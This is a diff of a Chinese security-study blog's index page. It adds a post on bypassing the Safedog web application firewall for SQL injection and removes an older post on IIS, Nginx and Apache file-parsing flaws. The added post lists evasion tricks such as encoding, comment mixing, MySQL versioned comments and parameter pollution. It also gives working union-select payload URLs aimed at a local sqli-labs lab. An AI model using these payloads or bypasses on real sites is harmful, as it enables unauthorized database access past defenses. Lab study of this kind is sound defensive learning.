@@ -64,6 +64,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-WAF-安全狗绕过SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2021-12-03T05:51:16.000Z" itemprop="datePublished">2021-12-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/">WAF-安全狗绕过SQL注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="WAF绕过-安全狗"><a href="#WAF绕过-安全狗" class="headerlink" title="WAF绕过-安全狗"></a>WAF绕过-安全狗</h4><p>阿里云、云盾、宝塔、安全狗</p>
+<p>深信服、绿盟、天融信、奇安信等等</p>
+<h4 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h4><p>1、GET方式<br>2、POST方式<br>3、http头部-爬虫白名单</p>
+<h4 id="干扰字符"><a href="#干扰字符" class="headerlink" title="干扰字符"></a>干扰字符</h4><p>1、大小写<br>     进行字母大小写绕过<br>2、加密<br>     字符串加密<br>3、编码<br>     url、md5，base64等几种常见的编码方式<br>4、等价函数<br>     由于检测到关键字，因此无法使用某些函数或命令，但在很多情况下，我们可以使用它们的等效或类似代码<br>     替换mid、ascii、eval等几种常见的敏感函数，来执行同样的效果，用其他函数来取代敏感函数<br>5、特殊符号<br>     绕过正则表达式的匹配<br>     +、`、~、!、@、%、()、[]、.、-、+ 、|、%00<br>6、注释符混用    /<strong>/<br>      类似跟特殊符号的作用<br>      select database() = select database/</strong>/()<br>7、参数污染</p>
+<p>#数据库注释符<br>①Oracle<br>– 单行注释<br>/<em>多行注释</em>/ </p>
+<p>②MS SQL Server<br>– 单行注释<br>/<em>多行注释</em>/ </p>
+<p>③MySQL<br>#单行注释<br>– 单行注释（特别注意，– 后有个空格！！！）<br>/<em>多行注释</em>/</p>
+<h4 id="SQL注入绕过实验"><a href="#SQL注入绕过实验" class="headerlink" title="SQL注入绕过实验"></a>SQL注入绕过实验</h4><p>%00 空字符<br>%0a 换行符<br>%23 #</p>
+<p>/* <em>/<br>/</em>!<em>/<br>/</em>!44509*/<br>/<em>!/</em>!*/</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>/%23a<br>select 1,2,3#</p>
+<p>#payload<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union all%23%0Aselect 1,2,3#<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>/%23a%0Aselect 1,2,3#<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>/%23a%0Aselect 1,database%23a%0A(),3#<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>/%23a%0A/<em>!select 1,database%23x%0A(),3</em>/#</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=1/*&amp;id=-1%20union%20select%201,2,3%23*/">http://192.168.80.140/sqlilabs/Less-2/?id=1/*&amp;id=-1%20union%20select%201,2,3%23*/</a><br>参数污染：安全狗进行检测得时候，会以为后面得已经被注释了，所以不会去检测，然后由于参数污染，实际上接受得是后面得那部分&amp;后面的语句</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union /<em>!44509select</em>/ 1,2,3#<br><a target="_blank" rel="noopener" href="http://192.168.80.140/sqlilabs/Less-2/?id=-1">http://192.168.80.140/sqlilabs/Less-2/?id=-1</a> union/<em>%00</em>//<em>!44509select</em>/ 1,database%23x%0A(),3#</p>
+<p>如果在/<em>后加惊叹号!意为/</em> <em>/里的语句将被执行，在mysql中 /</em>! ….<em>/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在/</em>!….*/中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="http://www.360doc.cn/mip/960801574.html?ivk_sa=1024320u">http://www.360doc.cn/mip/960801574.html?ivk_sa=1024320u</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/" data-id="ckwpz2huw000a8kvjd9vthp54" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-XXE漏洞-利用检测绕过" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/" class="article-date">
@@ -149,7 +200,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/" data-id="ckwjds8ml000c5gvjfj3b4n0h" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/" data-id="ckwpz2huz000d8kvjeitwcauy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -217,7 +268,7 @@ echo $flag1;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckwjds8me00045gvjg2kde9mr" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckwpz2hur00048kvj99vvc5t3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -262,7 +313,7 @@ echo $flag1;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckwjds8n9001b5gvjg396bs30" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckwpz2hvk001b8kvj310e7xep" class="article-share-link">Share</a>
       
       
     </footer>
@@ -311,7 +362,7 @@ echo $flag1;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckwjds8nb001c5gvj43990wcr" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckwpz2hvl001c8kvj0fl17lx9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -365,7 +416,7 @@ echo $flag1;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckwjds8n600165gvjbe7xe0ob" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckwpz2hvi00178kvj0lv67phd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -422,7 +473,7 @@ echo system($code);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckwjds8mf00065gvjfltmfj0f" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckwpz2hus00068kvjaas41jzr" class="article-share-link">Share</a>
       
       
     </footer>
@@ -487,7 +538,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckwjds8m500005gvjgvcc29bf" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckwpz2hug00008kvj8oop9i6y" class="article-share-link">Share</a>
       
       
     </footer>
@@ -535,7 +586,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckwjds8mw000t5gvjgewpfiab" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckwpz2hv8000t8kvj3l4u3zb1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -588,51 +639,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckwjds8mv000s5gvja9cn71hj" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-文件上传漏洞-解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time datetime="2021-10-23T05:44:59.000Z" itemprop="datePublished">2021-10-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="各个平台解析漏洞"><a href="#各个平台解析漏洞" class="headerlink" title="各个平台解析漏洞"></a>各个平台解析漏洞</h3><p>​     IIS,Apache,Nginx</p>
-<h4 id="IIS6-0有2种解析漏洞"><a href="#IIS6-0有2种解析漏洞" class="headerlink" title="IIS6.0有2种解析漏洞"></a>IIS6.0有2种解析漏洞</h4><p>前提：开启Active Server Pages服务拓展(一般情况下都是开启的)<br>1、目录解析<br>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。<br>2、文件解析<br>*.asp;.jpg 像这种畸形文件名在“;”后面的直接被忽略，也就是说当成 *.asp文件执行。</p>
-<h4 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h4><p>解析过程同Nginx解析漏洞复现</p>
-<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p>   解析test.jpg/.php 以php解析运行<br>   文件名逻辑漏洞(CVE-2013-4547)</p>
-<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p>1、多后缀名    test.php.ab.cd.ef   特点：apache从后到前识别，遇到无法识别的后缀进行往前看<br>2、罕见后缀    7z<br>3、.htaccess文件</p>
-<h4 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h4><p><a target="_blank" rel="noopener" href="http://www.yucedu.com/1.html">www.yucedu.com/1.html</a>  静态<br><a target="_blank" rel="noopener" href="http://www.yucedu.com/?id=1">www.yucedu.com/?id=1</a>  动态<br><a target="_blank" rel="noopener" href="http://www.yucedu.com/1">www.yucedu.com/1</a>   伪静态，实质上是动态<br>三个显示的界面都是一样，只是url上表现不同</p>
-<h4 id="各个WEB编辑器安全问题"><a href="#各个WEB编辑器安全问题" class="headerlink" title="各个WEB编辑器安全问题"></a>各个WEB编辑器安全问题</h4><p><a target="_blank" rel="noopener" href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/">https://navisec.it/编辑器漏洞手册/</a></p>
-<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/">https://navisec.it/编辑器漏洞手册/</a><br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YbZ4nfaAzrlLZ7afU1LcBQ">https://pan.baidu.com/s/1YbZ4nfaAzrlLZ7afU1LcBQ</a>     提取码：p8cd  通达OA系统源码</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckwjds8n300125gvjdg2x5ntu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckwpz2hva000v8kvjh6r77v40" class="article-share-link">Share</a>
       
       
     </footer>
@@ -646,7 +653,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -665,7 +672,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
     </div>
   </div>
 
@@ -676,6 +683,10 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/">WAF-安全狗绕过SQL注入</a>
+          </li>
         
           <li>
             <a href="/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/">XXE漏洞-利用检测绕过</a>
@@ -691,10 +702,6 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
         
           <li>
             <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
           </li>
         
       </ul>
